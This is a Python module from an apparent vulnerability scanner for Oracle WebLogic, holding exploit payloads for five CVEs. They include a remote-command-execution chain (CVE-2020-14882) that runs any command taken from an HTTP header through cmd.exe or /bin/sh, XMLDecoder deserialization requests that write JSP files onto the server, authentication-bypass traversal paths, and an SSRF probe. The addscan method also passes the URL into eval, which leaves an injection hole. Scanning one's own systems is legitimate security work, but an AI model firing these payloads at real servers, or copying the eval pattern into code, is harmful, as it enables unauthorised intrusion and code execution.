#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
    Weblogic扫描类: 
        1. Weblogic 管理控制台未授权远程命令执行
            CVE-2020-14882
            
        2. Weblogic 权限验证绕过漏洞
            CVE-2020-14750
            
        3. Weblogic wls9_async_response 反序列化漏洞
            CVE-2019-2725
            
        4. Weblogic 'wls-wsat' XMLDecoder 反序列化漏洞
            CVE-2017-10271

        5. Weblogic 服务端请求伪造 (SSRF)
            CVE-2014-4210
'''

from lib.initial.config import config
from lib.tool.md5 import md5, random_md5
from lib.tool.thread import thread
from payloads.Weblogic.cve_2014_4210 import cve_2014_4210_scan
from payloads.Weblogic.cve_2017_10271 import cve_2017_10271_scan
from payloads.Weblogic.cve_2019_2725 import cve_2019_2725_scan
from payloads.Weblogic.cve_2020_14750 import cve_2020_14750_scan
from payloads.Weblogic.cve_2020_14882 import cve_2020_14882_scan

class Weblogic():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'Weblogic'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.cve_2020_14882_payloads = [
            {
                'path': 'images/%252E./consolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession(\'weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler");field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod("getServletRequest").invoke(obj); String cmd = req.getHeader("cmd");String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};if(cmd != null ){ String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter("\\\\A").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod("getResponse").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();} currentThread.interrupt();\')',
                'data': ''
            },
            {
                'path': 'images/%252e%252e%252fconsolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession(\'weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler");field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod("getServletRequest").invoke(obj); String cmd = req.getHeader("cmd");String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};if(cmd != null ){ String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter("\\\\A").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod("getResponse").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();} currentThread.interrupt();\')',
                'data': ''
            },
            {
                'path': 'console/images/%252E./consolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession(\'weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler");field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod("getServletRequest").invoke(obj); String cmd = req.getHeader("cmd");String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};if(cmd != null ){ String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter("\\\\A").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod("getResponse").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();} currentThread.interrupt();\')',
                'data': ''
            },
            {
                'path': 'console/images/%252e%252e%252fconsolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession(\'weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler");field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod("getServletRequest").invoke(obj); String cmd = req.getHeader("cmd");String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};if(cmd != null ){ String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter("\\\\A").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod("getResponse").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();} currentThread.interrupt();\')',
                'data': ''
            }
        ]

        self.cve_2020_14750_payloads = [
            {
                'path': 'images/%252E./console.portal',
                'data': ''
            },
            {
                'path': 'images/%252e%252e%252fconsole.portal',
                'data': ''
            },
            {
                'path': 'css/%252E./console.portal',
                'data': ''
            },
            {
                'path': 'css/%252e%252e%252fconsole.portal',
                'data': ''
            },
            {
                'path': 'console/images/%252E./console.portal',
                'data': ''
            },
            {
                'path': 'console/images/%252e%252e%252fconsole.portal',
                'data': ''
            },
            {
                'path': 'console/css/%252E./console.portal',
                'data': ''
            },
            {
                'path': 'console/css/%252e%252e%252fconsole.portal',
                'data': ''
            }
        ]

        self.cve_2019_2725_payloads = [
            {
                'path': '_async/AsyncResponseService',
                'data': '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"><soapenv:Header><wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java version="1.8.0_131" class="java.beans.xmlDecoder"><object class="java.io.PrintWriter"><string>servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/mouse.jsp</string><void method="println"><string><![CDATA[
<% out.println("CVE/2019/2725"); %>]]>
</string></void><void method="close"/></object></java></work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>'''
            }
        ]

        self.cve_2017_10271_payloads = [
            {
                'path': 'wls-wsat/CoordinatorPortType',
                'data': '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
      <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
         <java version="1.6.0" class="java.beans.XMLDecoder">
                    <object class="java.io.PrintWriter"> 
                        <string>servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/mouse.jsp</string><void method="println">
                        <string><![CDATA[<% out.println("<h1>CVE/2017/10271</h1>"); %>]]></string></void><void method="close"/>
                    </object>
            </java>
        </work:WorkContext>
      </soapenv:Header>
      <soapenv:Body/>
</soapenv:Envelope>'''
            },
            {
                'path': 'wls-wsat/CoordinatorPortType',
                'data': '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
      <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
         <java version="1.6.0" class="java.beans.XMLDecoder">
                    <object class="java.io.PrintWriter"> 
                        <string>servers/AdminServer/tmp/_WL_internal/wls-wsat/9j4dqk/war/mouse.jsp</string><void method="println">
                        <string><![CDATA[<% out.println("<h1>CVE/2017/10271</h1>"); %>]]></string></void><void method="close"/>
                    </object>
            </java>
        </work:WorkContext>
      </soapenv:Header>
      <soapenv:Body/>
</soapenv:Envelope>'''
            }
        ]

        self.cve_2014_4210_payloads = [
            {
                'path': 'uddiexplorer/SearchPublicRegistries.jsp?operator=http://dnsdomain/&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search',
                'data': ''
            },
            {
                'path': 'SearchPublicRegistries.jsp?operator=http://dnsdomain/&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search',
                'data': ''
            }
        ]

    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.cve_2014_4210_scan, url=url),
            thread(target=self.cve_2017_10271_scan, url=url),
            thread(target=self.cve_2019_2725_scan, url=url),
            thread(target=self.cve_2020_14750_scan, url=url),
            thread(target=self.cve_2020_14882_scan, url=url),
        ]

Weblogic.cve_2014_4210_scan = cve_2014_4210_scan
Weblogic.cve_2017_10271_scan = cve_2017_10271_scan
Weblogic.cve_2019_2725_scan = cve_2019_2725_scan
Weblogic.cve_2020_14750_scan = cve_2020_14750_scan
Weblogic.cve_2020_14882_scan = cve_2020_14882_scan

weblogic = Weblogic()